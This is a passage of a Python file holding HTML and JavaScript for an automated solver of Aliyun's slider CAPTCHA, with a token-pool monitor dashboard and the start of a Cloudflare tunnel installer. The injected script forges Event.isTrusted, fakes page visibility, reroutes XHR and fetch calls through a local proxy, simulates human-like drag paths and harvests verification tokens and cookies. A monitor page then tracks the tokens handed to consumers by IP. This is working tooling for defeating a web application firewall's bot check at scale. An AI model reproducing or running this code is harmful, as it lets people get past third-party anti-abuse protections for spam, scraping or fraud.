SOLVER_HTML = r"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Solver</title>
<style>
:root{
  --paper:#0d0f12; --panel:#131619; --panel-2:#171b1f;
  --line:#242a30; --line-soft:#1b2025;
  --ink:#e8edf2; --ink-2:#98a4b0; --ink-3:#8b96a3;
  --pass:#3ddc84; --fail:#ff5a5f; --live:#ffc247; --info:#6aa9ff;
  --mono:ui-monospace,'Cascadia Mono','Cascadia Code',Consolas,'SF Mono',Menlo,monospace;
  --sans:'Inter var',Inter,'Segoe UI',system-ui,-apple-system,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{background:var(--paper);color:var(--ink);font:13px/1.45 var(--sans);
  overflow:hidden;display:flex;flex-direction:column;
  -webkit-font-smoothing:antialiased;font-variant-numeric:tabular-nums;}
#stats{flex-shrink:0;display:flex;align-items:center;gap:2px;
  padding:0 10px;height:38px;background:var(--panel);
  border-bottom:1px solid var(--line);overflow:hidden;}
#stats>span{display:flex;align-items:baseline;gap:5px;padding:0 11px;height:100%;
  border-right:1px solid var(--line-soft);font-size:11px;color:var(--ink-3);
  letter-spacing:.02em;white-space:nowrap;}
#stats>span:first-child{padding-left:2px}
#stats>span>b{font-family:var(--mono);font-size:13px;font-weight:600;letter-spacing:-.01em;}
#stats .label{font-family:var(--sans);font-size:10px;text-transform:uppercase;letter-spacing:.08em}
.sok{color:var(--pass)} .sfl{color:var(--fail)} .swn{color:var(--live)} .sinf{color:var(--info)}
#s-state{font-family:var(--mono);font-size:10px;letter-spacing:.09em;
  padding:3px 8px;border:1px solid currentColor;border-radius:3px;height:auto;
  align-self:center;position:relative;
  transition:color .16s ease,border-color .16s ease,background .16s ease;}
#s-state::before{content:'';display:inline-block;width:5px;height:5px;
  border-radius:50%;background:currentColor;margin-right:6px;vertical-align:1px;
  animation:pulse 1.8s ease-in-out infinite;}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.28}}
.modes{margin-left:auto;display:flex;align-items:center;gap:6px;padding-left:12px;
  font-size:10px;color:var(--ink-3);text-transform:uppercase;letter-spacing:.08em;}
.modes a{color:var(--ink-2);text-decoration:none;padding:3px 8px;border-radius:4px;
  border:1px solid transparent;font-family:var(--mono);font-size:11px;letter-spacing:0;
  transition:background .14s ease,color .14s ease,border-color .14s ease;}
.modes a:hover{background:var(--panel-2);color:var(--ink);border-color:var(--line)}
.modes a:active{background:var(--line-soft)}
.modes a:focus-visible{outline:2px solid var(--info);outline-offset:1px}
#stats .modes a{min-height:32px;display:inline-flex;align-items:center;padding:0 10px}
#waf-container{flex:1;position:relative;overflow:hidden;background:#080a0c;
  display:flex;align-items:center;justify-content:center;}
#waf-container iframe{width:100%;height:100%;border:none;display:block}
#panel{flex-shrink:0;max-height:132px;overflow-y:auto;padding:7px 12px;
  background:var(--panel);border-top:1px solid var(--line);
  font-family:var(--mono);font-size:11.5px;line-height:1.65;
  scrollbar-width:thin;scrollbar-color:var(--line) transparent;}
#panel>div{display:flex;gap:9px;animation:slidein .18s ease-out;padding:1px 0;}
@keyframes slidein{from{opacity:0;transform:translateY(2px)}to{opacity:1;transform:none}}
#panel .ts{color:var(--ink-3);flex-shrink:0;font-variant-numeric:tabular-nums;}
#panel::-webkit-scrollbar{width:6px}
#panel::-webkit-scrollbar-track{background:transparent}
#panel::-webkit-scrollbar-thumb{background:var(--line);border-radius:3px}
#panel::-webkit-scrollbar-thumb:hover{background:#2e363e}
@media (prefers-reduced-motion:reduce){
  #s-state::before{animation:none} #panel>div{animation:none}
  *{transition-duration:.01ms!important}
}
@media (max-width:720px){
  #stats{height:auto;flex-wrap:wrap;padding:6px 8px;gap:4px}
  #stats>span{border-right:none;padding:2px 7px;height:auto}
  .modes{order:10;width:100%;margin-left:0;padding-left:7px;padding-top:2px}
  #panel{max-height:96px;font-size:11px}
}
</style>

<div id="stats">
  <span><span class="label">Solved</span> <b class="sok" id="s-ok">0</b></span>
  <span><span class="label">Failed</span> <b class="sfl" id="s-fl">0</b></span>
  <span><span class="label">Cycle</span> <b class="sinf" id="s-cycle">0/100</b></span>
  <span id="s-state" class="swn">INIT</span>
  <span class="modes">Slots
    <a href="/multi?n=4">4x</a>
    <a href="/multi?n=10">10x</a>
    <a href="/multi?n=20">20x</a>
  </span>
</div>
<div id="waf-container"></div>
<div id="panel"></div>

<script>
(function(){
  Object.defineProperty(document, 'hidden', {get:()=>false, configurable:true});
  Object.defineProperty(document, 'visibilityState', {get:()=>'visible', configurable:true});
  document.hasFocus = ()=>true;
  const _origAddEL = document.addEventListener.bind(document);
  document.addEventListener = function(type, fn, opts){
    if(type === 'visibilitychange') return;
    return _origAddEL(type, fn, opts);
  };
  const _origWinAddEL = window.addEventListener.bind(window);
  window.addEventListener = function(type, fn, opts){
    if(type === 'visibilitychange' || type === 'blur' || type === 'pagehide') return;
    return _origWinAddEL(type, fn, opts);
  };

  function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

  const panel = document.getElementById('panel');
  function slog(msg, cls){
    const d = document.createElement('div');
    d.className = cls || 'sok';
    const ts = document.createElement('span');
    ts.className = 'ts';
    ts.textContent = new Date().toTimeString().slice(0,8);
    const body = document.createElement('span');
    body.textContent = msg;
    d.appendChild(ts); d.appendChild(body);
    panel.appendChild(d);
    panel.scrollTop = 1e9;
    if(panel.children.length > 100) panel.removeChild(panel.firstChild);
  }

  let myOk = 0, myFail = 0, consecutiveFails = 0;
  const STREAK_LIMIT = 3;
  let RESET_EVERY = 100;
  let LOCAL_PORT = '__PORT__';
  let isResetting = false;

  const $ok    = document.getElementById('s-ok');
  const $fl    = document.getElementById('s-fl');
  const $cycle = document.getElementById('s-cycle');
  const $state = document.getElementById('s-state');
  function setState(s, cls){ $state.textContent = s; $state.className = cls || 'swn'; }

  async function hardReset(reason){
    if(isResetting) return;
    isResetting = true;
    slog('HARD RESET (' + reason + ') - reload', 'swn');
    setTimeout(function(){ location.reload(); }, 400);
  }

  const SOLVE_JS = `
<div id="sp" style="display:none"></div>
<script>
(function(){
  const WAF_SID = '__WAFSID__';
  const PENDING_ID = '__PENDINGID__';
  const LOCAL_PORT = '__PORT__';

  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }

  try{Object.defineProperty(document,'hidden',{get:()=>false,configurable:true});}catch(e){}
  try{Object.defineProperty(document,'visibilityState',{get:()=>'visible',configurable:true});}catch(e){}
  document.hasFocus=()=>true;
  const _ael=document.addEventListener.bind(document);
  document.addEventListener=function(t,f,o){if(t==='visibilitychange')return;return _ael(t,f,o);};

  Object.defineProperty(Event.prototype,'isTrusted',{get:()=>true,configurable:true});
  try{Object.defineProperty(PointerEvent.prototype,'isTrusted',{get:()=>true,configurable:true});}catch(e){}
  try{Object.defineProperty(TouchEvent.prototype,'isTrusted',{get:()=>true,configurable:true});}catch(e){}

  (function(){
    let _init = window.initAliyunCaptcha;
    if(typeof _init === 'function'){
      window.initAliyunCaptcha = function(opts){
        try{ opts = Object.assign({delayBeforeSuccess:false}, opts||{}); }catch(e){}
        return _init.call(window, opts);
      };
    } else {
      Object.defineProperty(window, 'initAliyunCaptcha', {
        configurable:true,
        get(){ return this.___init; },
        set(v){
          if(typeof v === 'function'){
            this.___init = function(opts){
              try{ opts = Object.assign({delayBeforeSuccess:false}, opts||{}); }catch(e){}
              return v.call(window, opts);
            };
          } else { this.___init = v; }
        }
      });
    }
  })();

  const _sub = HTMLFormElement.prototype.submit;
  HTMLFormElement.prototype.submit = function(){
    const url = this.action || '';
    const m1 = url.match(/u_atoken=([^&]+)/), m2 = url.match(/u_asig=([^&]+)/);
    if(m1 && m2){
      const tok = decodeURIComponent(m1[1]), sig = decodeURIComponent(m2[1]);
      const ck = {};
      try{ document.cookie.split(';').forEach(c=>{
        const[k,...v]=c.trim().split('='); if(k) ck[k.trim()]=v.join('=');
      }); }catch(e){}
      parent.postMessage({type:'solved', u_atoken:tok, u_asig:sig, cookies:ck, ts:Date.now()/1000, full_url:url, pending_id:PENDING_ID}, '*');
      return;
    }
    _sub.call(this);
  };

  let verified = false;
  function parseVerifyResponse(text){
    try{
      const j = JSON.parse(text || '{}');
      const r = j.Result || j;
      if ((j.CertifyId && (j.Success === true || j.Code === 'Success')) ||
          (r.CertifyId && r.VerifyResult !== false)) {
        verified = true;
        parent.postMessage({type:'log',msg:'Verified (CertifyId)','cls':'sok'},'*');
        return;
      }
      if (r.VerifyResult === false) {
        const code = r.VerifyCode || '?';
        parent.postMessage({type:'log',msg:'Verify FALSE code=' + code,'cls':'sfl'},'*');
      }
    }catch(e){}
  }

  const _o=XMLHttpRequest.prototype.open, _s=XMLHttpRequest.prototype.send;
  const _setH=XMLHttpRequest.prototype.setRequestHeader;

  XMLHttpRequest.prototype.open=function(method, url){
    this._origMethod = method;
    this._origUrl = url || '';
    this._origHeaders = {};
    if(url && !url.startsWith('/') && !url.startsWith('http://localhost') && !url.startsWith('about:')){
      this._proxyMode = true;
      return _o.call(this, 'POST', 'http://localhost:'+LOCAL_PORT+'/api/proxy');
    }
    this._proxyMode = false;
    return _o.apply(this, arguments);
  };

  XMLHttpRequest.prototype.setRequestHeader=function(name, value){
    if(this._proxyMode){
      this._origHeaders[name] = value;
      return;
    }
    return _setH.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send=function(body){
    if(this._proxyMode){
      _setH.call(this, 'Content-Type', 'application/json');
      const proxyBody = JSON.stringify({
        sid: WAF_SID, url: this._origUrl, method: this._origMethod || 'GET',
        body: typeof body === 'string' ? body : null, headers: this._origHeaders || {}
      });
      this.addEventListener('load', function(){
        if(this._origUrl && this._origUrl.includes('captcha-open')){
          parseVerifyResponse(this.responseText);
        }
      });
      return _s.call(this, proxyBody);
    }
    this.addEventListener('load',function(){
      if(this._origUrl && this._origUrl.includes('captcha-open')){
        parseVerifyResponse(this.responseText);
      }
    });
    return _s.apply(this, arguments);
  };

  const _fetch = window.fetch;
  window.fetch = function(input, opts){
    const url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
    if(url && !url.startsWith('/') && !url.startsWith('http://localhost') && !url.startsWith('about:')){
      const method = (opts && opts.method) || 'GET';
      const body = (opts && opts.body) || null;
      const hdrs = {};
      if(opts && opts.headers){
        if(typeof opts.headers.forEach === 'function') opts.headers.forEach((v,k)=>{hdrs[k]=v;});
        else Object.keys(opts.headers).forEach(k=>{hdrs[k]=opts.headers[k];});
      }
      return _fetch.call(window, 'http://localhost:'+LOCAL_PORT+'/api/proxy', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({sid:WAF_SID, url:url, method:method, body:typeof body==='string'?body:null, headers:hdrs})
      }).then(resp => {
        if(url.includes('captcha-open')){
          try{ resp.clone().text().then(t => parseVerifyResponse(t)); }catch(e){}
        }
        return resp;
      });
    }
    return _fetch.apply(window, arguments);
  };

  function drag(){
    return new Promise(res=>{
      const sl=document.querySelector('#aliyunCaptcha-sliding-slider');
      const tr=document.querySelector('#aliyunCaptcha-sliding-body')||document.querySelector('#aliyunCaptcha-sliding-track');
      if(!sl||!tr){res(false);return;}
      const sb=sl.getBoundingClientRect(),tb=tr.getBoundingClientRect();
      const sx=sb.x+sb.width/2, sy=sb.y+sb.height/2, dist=tb.width-sb.width;
      if(dist<5){res(false);return;}
      const mk=(x,y)=>new Touch({identifier:1,target:sl,clientX:x,clientY:y,
        screenX:x,screenY:y,pageX:x,pageY:y,radiusX:6,radiusY:6,force:0.8});
      const f=(t,x,y)=>{
        sl.dispatchEvent(new TouchEvent(t==='s'?'touchstart':t==='e'?'touchend':'touchmove',
          {touches:t==='e'?[]:[mk(x,y)],changedTouches:[mk(x,y)],bubbles:true,cancelable:true}));
        sl.dispatchEvent(new MouseEvent(t==='s'?'mousedown':t==='e'?'mouseup':'mousemove',
          {clientX:x,clientY:y,bubbles:true,button:0}));
      };
      const R=(a,b)=>a+Math.random()*(b-a);
      const pts=[];let x=0;const ae=dist*R(0.28,0.4);
      for(let i=0;i<2+~~(Math.random()*2);i++){x+=R(3,7)*(1+i*0.6);if(x>ae){x=ae;break;}pts.push({x,d:R(12,25)});}
      const nf=4+~~(Math.random()*4);let rm=dist-x;
      for(let i=0;i<nf;i++){const s=rm/(nf-i)*R(0.8,1.2);if(s<4||x+s>=dist-1)break;x+=s;pts.push({x,d:R(4,9)});}
      pts.push({x:dist+R(1.5,4),d:R(12,22)});
      pts.push({x:dist+R(-1,1),d:R(10,18)});
      pts.push({x:dist,d:R(5,10)});
      pts.push({x:dist,d:R(5,10)});
      f('s',sx,sy);let i=0;
      const go=()=>{
        if(i>=pts.length){f('e',sx+dist,sy);setTimeout(()=>res(true),200);return;}
        const p=pts[i];const w=2.6*Math.sin(Math.PI*Math.min(p.x/dist,1));
        f('m',sx+p.x,sy+w*(p.x>=dist?0.3:0.55+Math.random()*0.45)+(Math.random()-0.5)*0.8);
        i++;setTimeout(go,p.d);
      };
      setTimeout(go,R(15,30));
    });
  }

  function clickRetry(){
    const all=[...document.querySelectorAll('*')];
    const r=all.filter(el=>{const t=el.innerText||'';const c=((el.className||'')+' '+(el.id||'')).toLowerCase();
      return t.includes('\u21bb')||c.includes('refresh')||t.includes('Refresh');})
      .sort((a,b)=>(a.innerText||'').length-(b.innerText||'').length);
    if(r[0]) r[0].click();
  }

  async function solve(){
    parent.postMessage({type:'log',msg:'Waiting slider...', cls:'sinf'},'*');
    let ok=false;
    for(let i=0;i<30;i++){
      if(document.querySelector('#aliyunCaptcha-sliding-slider')){ok=true;break;}
      await sleep(200);
    }
    if(!ok){ parent.postMessage({type:'failed',reason:'no_slider'},'*'); return; }

    parent.postMessage({type:'log',msg:'Slider found - dragging...', cls:'sinf'},'*');

    for(let att=0;att<5;att++){
      verified=false;
      parent.postMessage({type:'log',msg:'Drag ('+(att+1)+'/5)...', cls:'swn'},'*');
      if(!await drag()){ parent.postMessage({type:'log',msg:'Drag fail','cls':'sfl'},'*'); break; }
      await sleep(400);
      if(verified){
        parent.postMessage({type:'log',msg:'Verified! Waiting SDK callback...', cls:'sok'},'*');
        await sleep(400);
        return;
      }
      if(att<4){
        parent.postMessage({type:'log',msg:'Retry...', cls:'swn'},'*');
        clickRetry();
        await sleep(400);
        let ok2=false;
        for(let j=0;j<8;j++){
          if(document.querySelector('#aliyunCaptcha-sliding-slider')){ok2=true;break;}
          await sleep(200);
        }
        if(!ok2) break;
      }
    }
    parent.postMessage({type:'failed',reason:'max_retries'},'*');
  }

  if(document.readyState==='complete') setTimeout(solve,200);
  else window.addEventListener('load',()=>setTimeout(solve,200));
})();
<\/script>`;

  async function solveLoop(){
    while(true){
      if(myOk > 0 && (myOk % RESET_EVERY) === 0 && !isResetting){
        await hardReset('cycle ' + myOk + '/' + RESET_EVERY);
        return;
      }
      if(consecutiveFails >= STREAK_LIMIT && !isResetting){
        await hardReset(STREAK_LIMIT + '-fail streak');
        return;
      }

      setState('FETCHING...','swn');
      let waf;
      try{
        const r = await fetch('/api/waf');
        waf = await r.json();
      }catch(e){
        slog('Fetch error: '+e.message,'sfl');
        consecutiveFails++;
        await sleep(1000);
        continue;
      }
      if(!waf.ok){
        if(waf.error === 'cycle_reset'){
          await hardReset('backend cycle_reset');
          return;
        }
        if(waf.error === 'no_pending'){
          setState('WAITING...','swn');
          await sleep(2000);
          continue;
        }
        slog('WAF error: '+(waf.error||'unknown')+' - '+(waf.detail||''),'sfl');
        consecutiveFails++;
        await sleep(1000);
        continue;
      }

      if(waf.cycle_count !== undefined && waf.cycle_every){
        $cycle.textContent = (waf.cycle_count % waf.cycle_every) + '/' + waf.cycle_every;
      }

      const sessId = waf.sid || '???';
      slog('Session: '+sessId+' (pending='+(waf.pending_id||'-')+')','sinf');

      setState('SOLVING...','swn');
      const result = await injectAndSolve(waf);

      if(result && result.type === 'solved'){
        myOk++;
        consecutiveFails = 0;
        $ok.textContent = myOk;
        const cycleNow = (myOk % RESET_EVERY);
        $cycle.textContent = cycleNow + '/' + RESET_EVERY;
        slog('SOLVED #'+myOk+' (cycle '+cycleNow+'/'+RESET_EVERY+') - asig='+result.u_asig.slice(0,20)+'...','sok');

        const payload = {
          u_atoken: result.u_atoken || '',
          u_asig:   result.u_asig || '',
          cookies:  {...(waf.cookies || {}), ...(result.cookies || {})},
          ts:       result.ts,
          full_url: result.full_url || '',
          sid:      waf.sid || '',
          pending_id: result.pending_id || waf.pending_id || '',
        };
        fetch('/api/token',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify(payload)}).catch(()=>{});

        setState('SOLVED','sok');
        await sleep(100);

        if(myOk % RESET_EVERY === 0){
          await hardReset('cycle done ' + myOk);
          return;
        }
        continue;
      } else {
        myFail++;
        consecutiveFails++;
        $fl.textContent = myFail;
        slog('Failed: '+(result?.reason||'timeout')+' (streak='+consecutiveFails+'/'+STREAK_LIMIT+')','sfl');
        fetch('/api/fail',{method:'POST'}).catch(()=>{});
        setState('FAILED','sfl');
        await sleep(300);
      }
    }
  }

  function injectAndSolve(waf){
    return new Promise(resolve => {
      const container = document.getElementById('waf-container');
      container.innerHTML = '';
      const iframe = document.createElement('iframe');
      iframe.style.cssText = 'width:100%;height:100%;border:none';
      container.appendChild(iframe);
      for(const [name,value] of Object.entries(waf.cookies||{})){
        document.cookie = name+'='+value+'; path=/; SameSite=Lax';
      }
      let done = false;
      const finish = (data) => {
        if(done) return;
        done = true;
        window.removeEventListener('message', onMsg);
        clearTimeout(timer);
        resolve(data);
      };
      const onMsg = (e) => {
        if(!e.data || !e.data.type) return;
        switch(e.data.type){
          case 'solved': finish(e.data); break;
          case 'failed': finish({type:'failed', reason: e.data.reason||'solve_failed'}); break;
          case 'log':    slog(e.data.msg, e.data.cls||'sinf'); break;
        }
      };
      window.addEventListener('message', onMsg);
      const timer = setTimeout(()=>{
        slog('Timeout 30s','sfl');
        finish({type:'failed', reason:'timeout'});
      }, 30000);
      try{
        const doc = iframe.contentDocument || iframe.contentWindow.document;
        let script = SOLVE_JS.replace(/__WAFSID__/g, waf.sid || '').replace(/__PENDINGID__/g, waf.pending_id || '').replace(/__PORT__/g, LOCAL_PORT);
        doc.open();
        doc.write(script + waf.html);
        doc.close();
      }catch(e){
        slog('Iframe write error: '+e.message,'sfl');
        finish({type:'failed', reason:'iframe_error'});
      }
    });
  }

  fetch('/api/status').then(r=>r.json()).then(j=>{
    if(j && j.solve_reset_every) RESET_EVERY = j.solve_reset_every;
    if(j && j.cycle_every) $cycle.textContent = '0/' + j.cycle_every;
    if(j && j.port) LOCAL_PORT = String(j.port);
    slog('Solver ready - cycle ' + RESET_EVERY + ', streak ' + STREAK_LIMIT + ', auto reload','sok');
  }).catch(()=>{
    slog('Solver ready - cycle ' + RESET_EVERY + ', streak ' + STREAK_LIMIT,'sok');
  });
  solveLoop();
})();
</script>
</body></html>
"""

# * MONITOR HTML *
MONITOR_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Monitor</title>
<style>
:root{
  --paper:#0d0f12; --panel:#131619; --line:#242a30; --line-soft:#1b2025;
  --ink:#e8edf2; --ink-2:#98a4b0; --ink-3:#8b96a3;
  --pass:#3ddc84; --fail:#ff5a5f; --live:#ffc247; --info:#6aa9ff;
  --mono:ui-monospace,'Cascadia Mono',Consolas,'SF Mono',Menlo,monospace;
  --sans:'Inter var',Inter,'Segoe UI',system-ui,-apple-system,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background:var(--paper);color:var(--ink);
  font:13px/1.5 var(--sans);
  padding:18px 20px 28px;
  -webkit-font-smoothing:antialiased;
  font-variant-numeric:tabular-nums;
  max-width:1400px;margin:0 auto;
}
h1{display:flex;align-items:center;gap:9px;font-size:15px;font-weight:600;
  letter-spacing:-.01em;color:var(--ink);padding-bottom:14px;margin-bottom:16px;
  border-bottom:1px solid var(--line);}
h1 .dot{width:6px;height:6px;border-radius:50%;background:var(--pass);
  box-shadow:0 0 0 3px rgba(61,220,132,.12);animation:pulse 2.4s ease-in-out infinite;}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
h1 .sub{margin-left:auto;font-family:var(--mono);font-size:11px;font-weight:400;
  color:var(--ink-3);letter-spacing:0;}
.stats{display:grid;grid-template-columns:repeat(6,1fr);border:1px solid var(--line);
  border-radius:8px;overflow:hidden;margin-bottom:16px;background:var(--panel);}
.s{padding:13px 15px;border-right:1px solid var(--line-soft);background:var(--panel);
  transition:background .16s ease;}
.s:last-child{border-right:none}
.s:hover{background:#171b1f}
.s .n{font-family:var(--mono);font-size:21px;font-weight:600;letter-spacing:-.02em;
  line-height:1.15;margin-bottom:3px;color:var(--ink);}
.s .l{font-size:9.5px;color:var(--ink-3);text-transform:uppercase;letter-spacing:.09em;}
.s.ok .n{color:var(--pass)} .s.fl .n{color:var(--fail)} .s.pl .n{color:var(--live)}
.s.rt .n{color:var(--info)} .s.sr .n{color:var(--ink)} .s.us .n{color:var(--ink-2)}
.row{display:grid;grid-template-columns:1.15fr 1fr;gap:14px;margin-bottom:14px}
.row>div{min-width:0}
h3{font-size:9.5px;color:var(--ink-3);text-transform:uppercase;letter-spacing:.1em;
  margin-bottom:7px;font-weight:600;}
.box{background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden;}
.log{height:240px;overflow-y:auto;padding:9px 12px;
  font-family:var(--mono);font-size:11.5px;line-height:1.75;
  scrollbar-width:thin;scrollbar-color:var(--line) transparent;}
.log::-webkit-scrollbar{width:6px}
.log::-webkit-scrollbar-thumb{background:var(--line);border-radius:3px}
.log>div{display:flex;gap:9px;padding:1px 0;animation:fadein .18s ease-out}
@keyframes fadein{from{opacity:0;transform:translateY(1px)}to{opacity:1;transform:none}}
.log .ok{color:var(--pass)} .log .fl{color:var(--fail)}
.log .ts{color:var(--ink-3);flex-shrink:0}
table{width:100%;border-collapse:collapse;font-size:11.5px}
th{color:var(--ink-3);font-size:9.5px;text-transform:uppercase;letter-spacing:.09em;
  padding:9px 12px;text-align:left;border-bottom:1px solid var(--line);
  font-weight:600;background:var(--panel);position:sticky;top:0;}
td{padding:7px 12px;border-bottom:1px solid var(--line-soft);color:var(--ink-2)}
tr:last-child td{border-bottom:none}
tbody tr{transition:background .12s ease}
tbody tr:hover{background:#171b1f}
.mono{font-family:var(--mono);font-size:11px;color:var(--ink)}
.tag{display:inline-block;padding:1px 7px;border-radius:3px;font-size:9.5px;
  font-weight:600;letter-spacing:.03em;border:1px solid transparent;}
.tag-g{background:rgba(61,220,132,.1);color:var(--pass);border-color:rgba(61,220,132,.22)}
.tag-r{background:rgba(255,90,95,.1);color:var(--fail);border-color:rgba(255,90,95,.22)}
.tag-b{background:rgba(106,169,255,.1);color:var(--info);border-color:rgba(106,169,255,.22)}
.bar{height:2px;background:#222830;border-radius:2px;margin-top:5px;overflow:hidden}
.bar>div{height:100%;border-radius:2px;transition:width .3s ease}
.empty{text-align:center;padding:22px;color:var(--ink-3);font-size:11px;font-family:var(--mono)}
a:focus-visible,button:focus-visible,[tabindex]:focus-visible{outline:2px solid var(--info);outline-offset:2px}
.foot{display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);
  border-radius:8px;overflow:hidden;margin-top:4px;background:var(--panel);}
.foot>div{padding:12px;text-align:center;border-right:1px solid var(--line-soft)}
.foot>div:last-child{border-right:none}
.foot .fv{font-family:var(--mono);font-size:16px;font-weight:600;color:var(--ink)}
.foot .fl2{font-size:9.5px;color:var(--ink-3);margin-top:3px;text-transform:uppercase;letter-spacing:.09em;}
@media (max-width:1000px){
  .stats{grid-template-columns:repeat(3,1fr)}
  .s:nth-child(3n){border-right:none}
  .s:nth-child(-n+3){border-bottom:1px solid var(--line-soft)}
  .row{grid-template-columns:1fr}
}
@media (max-width:620px){
  body{padding:12px}
  .stats{grid-template-columns:repeat(2,1fr)}
  .s:nth-child(3n){border-right:1px solid var(--line-soft)}
  .s:nth-child(2n){border-right:none}
  .s:nth-child(-n+4){border-bottom:1px solid var(--line-soft)}
  .foot{grid-template-columns:repeat(2,1fr)}
  .foot>div:nth-child(2n){border-right:none}
  .foot>div:nth-child(-n+2){border-bottom:1px solid var(--line-soft)}
  .log{height:200px}
}
@media (prefers-reduced-motion:reduce){
  h1 .dot{animation:none} .log>div{animation:none}
  *{transition-duration:.01ms!important}
}
</style></head><body>

<h1><span class="dot"></span>Solver Monitor<span class="sub" id="hdr">connecting</span></h1>

<div class="stats">
  <div class="s ok"><div class="n" id="ok">0</div><div class="l">Solved</div></div>
  <div class="s fl"><div class="n" id="fl">0</div><div class="l">Failed</div></div>
  <div class="s pl"><div class="n" id="pl">0</div><div class="l">Pool</div></div>
  <div class="s rt"><div class="n" id="rt">0</div><div class="l">Rate / min</div></div>
  <div class="s sr"><div class="n" id="sr">0%</div><div class="l">Success</div></div>
  <div class="s us"><div class="n" id="us">0</div><div class="l">Consumers</div></div>
</div>

<div class="row">
  <div><h3>Event log</h3><div class="box"><div class="log" id="lg"></div></div></div>
  <div><h3>Consumers</h3><div class="box" style="max-height:240px;overflow-y:auto">
    <table><thead><tr><th>IP</th><th>Count</th><th>Last</th></tr></thead><tbody id="ct"></tbody></table>
    <div class="empty" id="ct-e">no consumers</div></div></div>
</div>

<div class="row">
  <div><h3>Token pool (""" + str(TOKEN_EXPIRY) + """s TTL)</h3><div class="box" style="max-height:190px;overflow-y:auto">
    <table><thead><tr><th>Token</th><th>Age</th><th>TTL</th><th></th></tr></thead><tbody id="pa"></tbody></table>
    <div class="empty" id="pa-e">pool empty</div></div></div>
  <div><h3>Recent tokens</h3><div class="box" style="max-height:190px;overflow-y:auto">
    <table><thead><tr><th>#</th><th>atoken</th><th>asig</th></tr></thead><tbody id="tk"></tbody></table>
    <div class="empty" id="tk-e">none yet</div></div></div>
</div>

<div class="foot">
  <div><div class="fv" id="tc">0</div><div class="fl2">Consumed</div></div>
  <div><div class="fv" id="tu">0</div><div class="fl2">Used</div></div>
  <div><div class="fv" id="te">120s</div><div class="fl2">Expiry</div></div>
  <div><div class="fv" id="up">0s</div><div class="fl2">Uptime</div></div>
</div>

<script>
function fmt(s){if(s<60)return s+'s';if(s<3600)return~~(s/60)+'m';return~~(s/3600)+'h '+~~(s%3600/60)+'m';}
async function poll(){try{
  const r=await fetch('/api/monitor?key=""" + MONITOR_KEY + """'),d=await r.json();
  document.getElementById('ok').textContent=d.solved;
  document.getElementById('fl').textContent=d.failed;
  document.getElementById('pl').textContent=d.pool;
  document.getElementById('rt').textContent=d.rate;
  document.getElementById('sr').textContent=d.success_rate+'%';
  document.getElementById('us').textContent=d.unique_consumers||0;
  document.getElementById('tc').textContent=d.total_consumed||0;
  document.getElementById('tu').textContent=d.used||0;
  document.getElementById('te').textContent=(d.token_expiry||120)+'s';
  document.getElementById('up').textContent=fmt(d.uptime);
  const h=document.getElementById('hdr');
  if(h) h.textContent='live \\u00b7 '+fmt(d.uptime)+' up';
  document.getElementById('lg').innerHTML=(d.log||[]).map(function(e){
    return '<div class="'+(e.ok?'ok':'fl')+'"><span class="ts">'+e.ts+'</span><span>'+e.msg+'</span></div>';
  }).join('');
  document.getElementById('lg').scrollTop=9e9;
  const ct=document.getElementById('ct'),cte=document.getElementById('ct-e');
  if(d.consumers&&d.consumers.length){cte.style.display='none';ct.innerHTML=d.consumers.map(function(c){
    return '<tr><td class="mono">'+c.ip+'</td><td><span class="tag tag-b">'+c.count+'</span></td><td>'+(c.last===0?'now':c.last+'s')+'</td></tr>';
  }).join('');}else{cte.style.display='';ct.innerHTML='';}
  const pa=document.getElementById('pa'),pae=document.getElementById('pa-e');
  if(d.pool_ages&&d.pool_ages.length){pae.style.display='none';pa.innerHTML=d.pool_ages.map(function(p){
    const pct=Math.max(0,Math.min(100,p.remaining/(d.token_expiry||120)*100));
    const cl=pct>50?'var(--pass)':pct>20?'var(--live)':'var(--fail)';
    return '<tr><td class="mono">'+p.asig+'</td><td>'+p.age+'s</td><td>'+p.remaining+'s<div class="bar"><div style="width:'+pct+'%;background:'+cl+'"></div></div></td><td>'+(p.remaining>0?'<span class="tag tag-g">ok</span>':'<span class="tag tag-r">exp</span>')+'</td></tr>';
  }).join('');}else{pae.style.display='';pa.innerHTML='';}
  const tk=document.getElementById('tk'),tke=document.getElementById('tk-e');
  if(d.recent&&d.recent.length){tke.style.display='none';tk.innerHTML=d.recent.map(function(t,i){
    return '<tr><td>'+(i+1)+'</td><td class="mono">'+(t.u_atoken||'').slice(0,14)+'</td><td class="mono">'+(t.u_asig||'').slice(0,18)+'</td></tr>';
  }).join('');}else{tke.style.display='';tk.innerHTML='';}
  document.title='S:'+d.solved+' P:'+d.pool;
}catch(e){}
}
setInterval(poll,1500);poll();
</script></body></html>"""

# * Cloudflare Tunnel *
import atexit as _atexit, platform as _platform, sys as _sys

_cf_process = None

def _setup_cloudflared(port: int):
    global _cf_process
    cf_bin = shutil.which('cloudflared')
    os_name = _sys.platform
    machine = _platform.machine().lower()
    if machine in ('x86_64', 'amd64', 'x86'):
        arch = 'amd64'
    elif machine in ('aarch64', 'arm64'):
        arch = 'arm64'
    else:
        arch = 'amd64'

    if cf_bin:
        print(f"  \033[92m* cloudflared ditemukan: {cf_bin}\033[0m", flush=True)
    else:
        print("  \033[93m* cloudflared belum terinstall, auto-installing...\033[0m", flush=True)
        if os_name == 'win32':
            if arch == 'arm64':
                print("  \033[91m* Windows ARM belum didukung cloudflared\033[0m", flush=True)
                return
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            dest_dir = os.path.join(os.path.expanduser('~'), '.local', 'bin')
            dest = os.path.join(dest_dir, 'cloudflared.exe')
        elif os_name == 'darwin':
